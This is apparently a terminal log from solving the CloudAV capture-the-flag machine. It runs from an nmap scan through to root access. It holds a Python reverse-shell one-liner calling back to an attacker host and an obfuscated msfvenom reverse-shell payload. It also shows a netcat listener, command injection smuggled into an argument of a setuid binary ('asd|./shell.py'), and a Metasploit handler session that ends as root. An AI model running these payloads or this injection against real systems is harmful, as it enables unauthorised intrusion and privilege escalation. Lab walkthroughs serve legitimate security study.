hack@kali:~$ nmap -A -p- 192.168.1.25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 11:07 CEST
Nmap scan report for cloudav.homenet.telecomitalia.it (192.168.1.25)
Host is up (0.00059s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6a:42:4b:7c:2a:06:0f:50:4b:32:cf:b8:31:e9:c4:f4 (RSA)
|   256 81:c7:60:0f:d7:1e:56:f7:a3:1e:9f:76:27:bd:31:27 (ECDSA)
|_  256 71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.15rc1)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.88 seconds



Enter: password


python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.14",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'




hack@kali:~/CTF/CloudAV$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.14 LPORT=4444 -f raw > shell.py
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 361 bytes

hack@kali:~/CTF/CloudAV$ ll
totale 8
-rw-r--r-- 1 hack hack 1143 mag  9 11:13 notes.txt
-rw-r--r-- 1 hack hack  361 mag  9 11:23 shell.py
hack@kali:~/CTF/CloudAV$ cat shell.py 
python -c "exec('aW1wb3J0IHNvY2tldCwgIHN1YnByb2Nlc3MsICBvcztob3N0PSIxOTIuMTY4LjEuMTQiO3BvcnQ9NDQ0NDtzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsICBzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoaG9zdCwgIHBvcnQpKTtvcy5kdXAyKHMuZmlsZW5vKCksICAwKTtvcy5kdXAyKHMuZmlsZW5vKCksICAxKTtvcy5kdXAyKHMuZmlsZW5vKCksICAyKTtwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik='.decode('base64'))"



Start server:
hack@kali:~$ python -m SimpleHTTPServer 8888
Serving HTTP on 0.0.0.0 port 8888 ...


hack@kali:~/CTF/CloudAV$ nc -lvnp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 192.168.1.25.
Ncat: Connection from 192.168.1.25:37612.
/bin/sh: 0: can't access tty; job control turned off
$ 
$ 
$ 
$ ls
app.py
database.sql
samples
templates
$ cd ..
$ ls -la
total 64
drwxr-xr-x 6 scanner scanner 4096 May  9 09:25 .
drwxr-xr-x 4 root    root    4096 Oct 21  2018 ..
-rw------- 1 scanner scanner    5 Oct 24  2018 .bash_history
-rw-r--r-- 1 scanner scanner  220 Oct 21  2018 .bash_logout
-rw-r--r-- 1 scanner scanner 3771 Oct 21  2018 .bashrc
drwx------ 2 scanner scanner 4096 Oct 21  2018 .cache
drwxrwxr-x 4 scanner scanner 4096 Oct 24  2018 cloudav_app
drwx------ 3 scanner scanner 4096 Oct 21  2018 .gnupg
drwxrwxr-x 3 scanner scanner 4096 Oct 21  2018 .local
-rw-r--r-- 1 scanner scanner  807 Oct 21  2018 .profile
-rw-rw-r-- 1 scanner scanner   66 Oct 21  2018 .selected_editor
-rwxrwxr-x 1 scanner scanner  361 May  9 09:23 shell.py
-rwsr-xr-x 1 root    scanner 8576 Oct 24  2018 update_cloudav
-rw-rw-r-- 1 scanner scanner  393 Oct 24  2018 update_cloudav.c
$ 
$ ./update_cloudav 'asd|./shell.py'
ERROR: Problem with internal logger (UpdateLogFile = /var/log/clamav/freshclam.log).



msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.1.14:4444 



[*] Command shell session 4 opened (192.168.1.14:4444 -> 192.168.1.25:35024) at 2020-05-09 11:40:37 +0200

python3 -c "import pty;pty.spawn('/bin/bash')"
id
id
root@cloudav:~# id
uid=0(root) gid=0(root) groups=0(root),1001(scanner)

